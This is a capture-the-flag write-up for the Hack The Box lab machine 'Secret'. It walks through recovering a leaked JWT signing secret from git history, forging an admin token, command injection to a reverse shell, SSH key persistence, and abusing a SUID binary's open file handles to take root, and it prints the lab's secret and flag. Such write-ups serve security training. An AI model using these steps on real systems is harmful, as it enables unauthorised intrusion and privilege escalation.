| **Machine**             | \[Secret]                                                                                                                  |
| :---------------------- | :------------------------------------------------------------------------------------------------------------------------------- |
| **Platform**            | Hack The Box                                                                                                                     |
| **Difficulty**          | Medium                                                                                                                           |
| **Key Concepts**        | Nmap, .git Source Code Recovery, Token Secret, JWT Forging, API Fuzzing, Command Injection, Reverse Shell, SSH Persistence, SUID Binary Exploitation, Root Privilege Escalation |

# Enumeration
Running nmap reveals three open ports:

```bash
└─$ sudo nmap -sCV 10.129.156.33 -p- --min-rate=1000     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 18:35 CEST
Nmap scan report for 10.129.156.33
Host is up (0.032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel=
```

# Initial Web Recon

Visiting port 80 shows an API documentation page:

<img width="1551" height="682" alt="Screenshot 2025-08-12 184328" src="https://github.com/user-attachments/assets/098dc213-840f-42ff-8122-00177a35b601" />

Port 3000 displays the same page.

At the bottom of the page, there’s a link to download the source code:
<img width="888" height="347" alt="Screenshot 2025-08-12 185217" src="https://github.com/user-attachments/assets/5870a2b7-48be-4ddb-8126-7fd0d0403dfb" />

I Downloaded and unzipped the file:
```bash
└─$ ls -la
total 116
drwxrwxr-x   8 kali kali  4096 Sep  3  2021 .
drwxrwxr-x   3 kali kali  4096 Aug 12 18:53 ..
-rw-rw-r--   1 kali kali    72 Sep  3  2021 .env
drwxrwxr-x   8 kali kali  4096 Sep  8  2021 .git
-rw-rw-r--   1 kali kali   885 Sep  3  2021 index.js
drwxrwxr-x   2 kali kali  4096 Aug 13  2021 model
drwxrwxr-x 201 kali kali  4096 Aug 13  2021 node_modules
-rw-rw-r--   1 kali kali   491 Aug 13  2021 package.json
-rw-rw-r--   1 kali kali 69452 Aug 13  2021 package-lock.json
drwxrwxr-x   4 kali kali  4096 Sep  3  2021 public
drwxrwxr-x   2 kali kali  4096 Sep  3  2021 routes
drwxrwxr-x   4 kali kali  4096 Aug 13  2021 src
-rw-rw-r--   1 kali kali   651 Aug 13  2021 validations.js

```
The .git directory looked promising. Checking commit history

```bash
└─$ git log --oneline --graph --all
* e297a27 (HEAD -> master) now we can view logs from server 😃
* 67d8da7 removed .env for security reasons
* de0a46b added /downloads
* 4e55472 removed swap
* 3a367e7 added downloads
* 55fe756 first commit

```

Commit 67d8da7 is intersting, it says it was remove for security reasons, checking it i find a token_secret

```bash
└─$ git show 67d8da7               
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret

```

This could be huge and help us forge an Admin JWT token.

# User Registration and Login

Checking the API documentation shows a /priv endpoint for admins:

    In this private route, admin users can verify their status. Non-admin users see their role. Unauthenticated requests return an error. Admins might get the web flag here.

We can craft an admin JWT using the secret to access it. First, we need an account.

Using /user/register with JSON body and correct headers

<img width="1247" height="629" alt="Screenshot 2025-08-12 193000" src="https://github.com/user-attachments/assets/b28492d2-5895-4633-a680-790b5b171582" />

Logging in at /user/login returns a JWT

<img width="1257" height="438" alt="Screenshot 2025-08-12 193435" src="https://github.com/user-attachments/assets/48dffac9-bb81-4854-b3af-aa83c24fc0b5" />

# Crafting an Admin Token

From the API docs, the admin role likely requires "role":"admin" in the payload.
Decoded JWT at jwt.io, then used token.dev to sign a modified payload with the recovered secret.

<img width="1355" height="813" alt="Screenshot 2025-08-12 200506" src="https://github.com/user-attachments/assets/f1798cac-bbcc-43fc-8bd7-8b4b08964863" />

<img width="1677" height="675" alt="Screenshot 2025-08-12 200553" src="https://github.com/user-attachments/assets/18991c06-b3b9-44dc-a2ac-3326f47234f9" />

Now adding the token to auth-token header grants admin access

<img width="1234" height="453" alt="Screenshot 2025-08-12 200706" src="https://github.com/user-attachments/assets/7fb13222-ba3b-4564-b285-208bd829afb6" />

But we can`t abuse it, we need to find some procteted endpoints or anything else.

I came back to the .git directory, checked previous commits and found a source code which revealed that there is a /logs endpoint that accepts file parameter.

<img width="550" height="853" alt="Screenshot 2025-08-12 202407" src="https://github.com/user-attachments/assets/a063a156-5c1d-4227-a88b-e78b66f6e97c" />

if we intercept the /logs endpoint, and add some random string for the file parameter, we see "cmd" in the body answer.

<img width="1125" height="360" alt="Screenshot 2025-08-12 202715" src="https://github.com/user-attachments/assets/bcebb92e-8a01-446a-8d1b-09bc749df2fc" />

In the backend, the /logs endpoint likely executes a command similar to

```bash
git log --oneline {file}
```

Since the {file} parameter is directly interpolated into a shell command without sanitization, it’s vulnerable to command injection. In Linux, multiple commands can be chained using a semicolon (;).
For example, on my Kali machine:

```bash
└─$ cat test; id
THIS IS TEST FILE WE ARE READING
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),106(bluetooth),113(scanner),136(wireshark),137(kaboxer),138(vboxsf)
```
Here, the cat test command outputs the file contents, and the semicolon chains another command (id), which is executed immediately after.
I applied the same logic to test remote command execution on the target. Before attempting a reverse shell, I first verified outbound connectivity. I spun up a Python HTTP server locally and used curl from the victim to fetch a file. If this worked, it would confirm that I could execute arbitrary commands on the target and that outbound traffic to my host was allowed.

<img width="1171" height="97" alt="Screenshot 2025-08-12 203521" src="https://github.com/user-attachments/assets/d9a62831-58d8-4963-ad35-4171b53c8d66" />

Confirmed, works!

# Reverse Shell
With the injection point confirmed, lets sent a reverse shell payload to my listener on port 9001

```bash
nc -lvnp 9001
connect to [10.10.14.189] from (UNKNOWN) [10.129.156.33] 34286
id
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
```

Upgraded to a TTY shell and retrieved the user flag

<img width="938" height="276" alt="Screenshot 2025-08-12 204006" src="https://github.com/user-attachments/assets/fca6bb4e-51bb-447c-9301-d354d871d05f" />

To make access persistent, generated SSH keys locally and added the public key to /home/dasith/.ssh/authorized_keys

```bash
└─$ ssh-keygen -t rsa -b 4096
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
Enter passphrase for "/home/kali/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:qusonXJ4NQSynlaDjmWPGa5d6TV5x7bdM7G2jnggars kali@kali
The key's randomart image is:
+---[RSA 4096]----+
|                 |
|. .              |
| o..             |
|..+o.            |
|++o*.. .S.       |
|.=+ * +.o =   .  |
|.= = o.+ + + . o |
|= *...o   ..o.*  |
| =..+oEo  ...oo+ |
+----[SHA256]-----+

```

```bash
mkdir ~/.ssh
chmod 700 ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
and logged in with SSH successfully.

```bash
└─$ ssh -i id_rsa dasith@10.129.156.33
....
The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Wed Sep  8 20:10:26 2021 from 10.10.1.168
dasith@secret:~$ 
```

# Privilege Escalation

While enumerating the system as the dasith user, I checked /opt and found an interesting binary with the SUID bit set

```bash
dasith@secret:/opt$ ls -la
total 56
drwxr-xr-x  2 root root  4096 Oct  7  2021 .
drwxr-xr-x 20 root root  4096 Oct  7  2021 ..
-rw-r--r--  1 root root  3736 Oct  7  2021 code.c
-rw-r--r--  1 root root 16384 Oct  7  2021 .code.c.swp
-rwsr-xr-x  1 root root 17824 Oct  7  2021 count
-rw-r--r--  1 root root  4622 Oct  7  2021 valgrind.log
```

The count binary runs with root privileges -rwsr-xr-x. Executing it shows that it counts entries, files, and directories for the given path

```bash
dasith@secret:/opt$ ./count
Enter source file/directory name: /root
-rw-r--r-- .viminfo
drwxr-xr-x ..
-rw-r--r-- .bashrc
drwxr-xr-x .local
drwxr-xr-x snap
lrwxrwxrwx .bash_history
drwx------ .config
drwxr-xr-x .pm2
-rw-r--r-- .profile
drwxr-xr-x .vim
drwx------ .
drwx------ .cache
-r-------- root.txt
drwxr-xr-x .npm
drwx------ .ssh

Total entries       = 15
Regular files       = 4
Directories         = 10
Symbolic links      = 1
Save results a file? [y/N]: y
Path: /tmp
Could not open /tmp for writing
```
In the same directory there’s a code.c file — the source code for count

<img width="608" height="809" alt="Screenshot 2025-08-12 210539" src="https://github.com/user-attachments/assets/92747eb6-8a90-4dfe-8210-5de018d3f541" />

Reading through it, I noticed that the binary keeps the file handle open for the entire runtime, even after displaying its statistics. Since it’s running as root, any file it opens stays accessible through /proc/pid/fd/ until the process ends.

This means that if I can get count to open a file I normally can’t access (e.g., /root/.viminfo), I can then read it from /proc using my unprivileged shell.

# Exploitation Steps
1. Run the binary and open the target file:
I chose /root/.viminfo because it’s world-readable but normally inaccessible due to /root directory permissions, once the stat are printed, i background it with CTRL+Z

```bash
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/.viminfo

Total characters = 16370
Total words      = 2228
Total lines      = 562
Save results a file? [y/N]: ^Z
[2]+  Stopped                 ./count
```

2. Find the PID of count
```bash
pidof count
1929 
```
3. Inspect the /proc/1929/fd directory

```bash
```bash
dasith@secret:/proc/1929/fd$ ls -l
total 0
lrwx------ 1 dasith dasith 64 Aug 12 19:24 0 -> /dev/pts/1
lrwx------ 1 dasith dasith 64 Aug 12 19:24 1 -> /dev/pts/1
lrwx------ 1 dasith dasith 64 Aug 12 19:24 2 -> /dev/pts/1
lr-x------ 1 dasith dasith 64 Aug 12 19:24 3 -> /root/.viminfo
```

4. Finally we can read the file 3, and find id_rsa.
<img width="815" height="645" alt="Screenshot 2025-08-12 212630" src="https://github.com/user-attachments/assets/237fd27a-3cf0-4928-a6d1-c04ea0e5c464" />

I copied the key to my local machine, fixed permission and used SSH to connect as root.
```bash
└─$ ssh -i id_rsa root@10.129.156.33
```

```bash
root@secret:~# cat root.txt
1be2b36afb5ab876fc89c6bc88496952
```

Done. 







```
